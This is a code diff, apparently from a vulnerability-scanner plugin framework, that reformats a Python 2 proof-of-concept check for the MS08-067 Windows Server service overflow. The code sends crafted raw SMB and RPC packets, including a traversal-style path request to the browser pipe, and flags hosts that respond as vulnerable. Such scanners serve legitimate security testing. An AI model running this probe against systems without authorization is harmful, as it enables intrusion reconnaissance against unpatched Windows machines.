@@ -6,11 +6,12 @@ import socket
 import urllib
 import urlparse
 
+
 class Vuln(ABVuln):
     vuln_id = 'MS08-067_0001_p'  # 平台漏洞编号，留空
     name = 'MS08-067 NetAPI32.dll 远程缓冲区溢出漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2008-10-23'  # 漏洞公布时间
     desc = '''
         MS08-067漏洞的全称为“Windows Server服务RPC请求缓冲区溢出漏洞”，如果用户在受影响的系统上收到特制的 RPC
@@ -30,6 +31,7 @@ class Vuln(ABVuln):
     product = 'Windows'  # 漏洞应用名称
     product_version = 'Microsoft Windows 2000、Windows XP 和 Windows Server 2003'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '988c0c68-4479-4335-8ab1-017833d64337'
     author = 'cscan'  # POC编写者
@@ -42,12 +44,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #可能需要ip地址
+
+            # 可能需要ip地址
             #ip = http.transform_target_ip(http.normalize_url(args['options']['target']))
             #port = args['options']['port']
 
-            #获取host和端口
+            # 获取host和端口
             target_parse = urlparse.urlparse(self.target)
             host = socket.gethostbyname(target_parse.hostname)
             port = target_parse.port if target_parse.port else 80
@@ -64,7 +66,8 @@ class Poc(ABPoc):
                  '0000000f0020001000000000050000000000044c000805b00a14e304ca24a04484e544c4d5353'
                  '50000300000000000000480000000000000048000000000000004000000000000000400000000'
                  '8000800400000000000000048000000050288a04e0055004c004c00556e69780053616d626100').decode('hex'),
-                '00000047ff534d427500000000080048000000000000000000000000ffffc42b0108000004ff000000000001001c0000'.decode('hex'),
+                '00000047ff534d427500000000080048000000000000000000000000ffffc42b0108000004ff000000000001001c0000'.decode(
+                    'hex'),
                 ('0000005cff534d42a2000000001801480000000000000000000000000108c42b0108000018ff0'
                  '00000000800160000000000000003000000000000000000000080000000010000000100000040'
                  '000000020000000009005c62726f7773657200').decode('hex'),
@@ -77,47 +80,50 @@ class Poc(ABPoc):
                  '00050000031000000074000000010000000000000000002000000002000100000000000000010'
                  '000000000aaaa0e000000000000000e0000005c00410041004100410041005c002e002e005c00'
                  '46004200560000000500000000000000050000005c004600420056000000aaaa0100000000000000').decode('hex'),
-                ]
+            ]
 
-            def setuserid(userid,data):
+            def setuserid(userid, data):
                 return data[:32]+userid+data[34:]
-            def settreeid(treeid,data):
+
+            def settreeid(treeid, data):
                 return data[:28]+treeid+data[30:]
-            def setfid(fid,data):
+
+            def setfid(fid, data):
                 return data[:67]+fid+data[69:]
 
             s = socket.socket()
-            s.connect((host,portint))
+            s.connect((host, portint))
             s.send(payload[0])
             s.recv(1024)
             s.send(payload[1])
             data = s.recv(1024)
             userid = data[32:34]
-            s.send(setuserid(userid,payload[2]))
+            s.send(setuserid(userid, payload[2]))
             s.recv(1024)
-            data = setuserid(userid,payload[3])
+            data = setuserid(userid, payload[3])
             path = '\\\\%s\\IPC$\x00' % host
             path = path + (26-len(path))*'\x3f'+'\x00'
             data = data + path
             s.send(data)
             data = s.recv(1024)
             tid = data[28:30]
-            s.send(settreeid(tid,setuserid(userid,payload[4])))
+            s.send(settreeid(tid, setuserid(userid, payload[4])))
             data = s.recv(1024)
             fid = data[42:44]
-            s.send(setfid(fid,settreeid(tid,setuserid(userid,payload[5]))))
+            s.send(setfid(fid, settreeid(tid, setuserid(userid, payload[5]))))
             s.recv(1024)
-            s.send(setfid(fid,settreeid(tid,setuserid(userid,payload[6]))))
+            s.send(setfid(fid, settreeid(tid, setuserid(userid, payload[6]))))
             data = s.recv(1024)
-            if data[9:13]=='\x00'*4:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+            if data[9:13] == '\x00'*4:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
